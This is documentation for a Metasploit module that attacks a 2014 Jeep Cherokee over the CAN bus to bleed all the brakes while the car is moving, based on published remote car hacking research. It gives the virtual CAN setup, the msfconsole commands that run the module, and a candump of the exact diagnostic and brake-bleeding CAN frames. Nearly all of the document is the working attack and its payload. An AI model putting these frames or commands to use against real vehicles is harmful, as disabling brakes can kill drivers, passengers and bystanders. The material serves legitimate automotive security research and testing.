## Introduction
This module will bleed all the brakes on the 2014 Jeep Cherokee while the car is moving. This has the result that the brakes will 
not work during this time and has significant safety issues, even if it only works if you are driving slowly.

References:
https://ioactive.com/wp-content/uploads/2018/05/IOActive_Remote_Car_Hacking-1.pdf
http://www.illmatics.com/Remote%20Car%20Hacking.pdf

Authors:
Charlie Miller # Original Author and Researcher 
Chris Valasek# Original Author and Researcher
Jay Turla # Metasploit Module

## Verification Steps

Fire up virtual CAN bus:

1. `sudo modprobe can`
2. `sudo modprobe vcan`
3. `sudo ip link add dev vcan0 type vcan`
4. `sudo ip link set up vcan0`

Launch msf:

5. Start `msfconsole`
6. `use auxiliary/server/local_hwbridge`
7. `set uripath testbus`
8. `run`
9. `use auxiliary/client/hwbridge/connect`
10. `set targeturi testbus`

## Options

```
Module options (post/hardware/automotive/cherokee_kill_brakes):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CANBUS                    no        CAN Bus to perform scan on, defaults to connected bus
   SESSION                   yes       The session to run this module on.
```

## Scenarios
You can test this module doing a candump wherein the first CAN Frame will start a diagnostic session with the ABS ECU and then bleed all the brakes at maximum which contains one message (InputOutput) but requires multiple CAN messages since the data is too long to fit in a single CAN frame.

```
msf5 auxiliary(client/hwbridge/connect) > run
[*] Running module against 127.0.0.1

[*] Attempting to connect to 127.0.0.1...
[*] Hardware bridge interface session 1 opened (127.0.0.1 -> 127.0.0.1) at 2019-09-11 04:59:40 -0700
[+] HWBridge session established
[*] HW Specialty: {"automotive"=>true}  Capabilities: {"can"=>true, "custom_methods"=>true}
[!] NOTICE:  You are about to leave the matrix.  All actions performed on this hardware bridge
[!]          could have real world consequences.  Use this module in a controlled testing
[!]          environment and with equipment you are authorized to perform testing on.
[*] Auxiliary module execution completed
msf5 auxiliary(client/hwbridge/connect) > sessions

Active sessions
===============

  Id  Name  Type                   Information  Connection
  --  ----  ----                   -----------  ----------
  1         hwbridge cmd/hardware  automotive   127.0.0.1 -> 127.0.0.1 (127.0.0.1)

msf5 auxiliary(client/hwbridge/connect) > sessions -i 1
[*] Starting interaction with 1...

hwbridge > run post/hardware/automotive/cherokee_kill_brakes CANBUS=vcan0

[*] Starting a diagnostic session with the ABS ECU...
[*] -- Bleeding all the brakes at maximum --
hwbridge > 
```

You can use candump to verify the CAN frames being sent:

```
└─# candump vcan0           
  vcan0  18DA28F1   [8]  02 10 03 00 00 00 00 00
  vcan0  18DA28F1   [8]  10 11 2F 5A BF 03 64 64
  vcan0  18DA28F1   [8]  64 64 64 64 64 64 64 64
  vcan0  18DA28F1   [8]  64 64 64 00 00 00 00 00
```
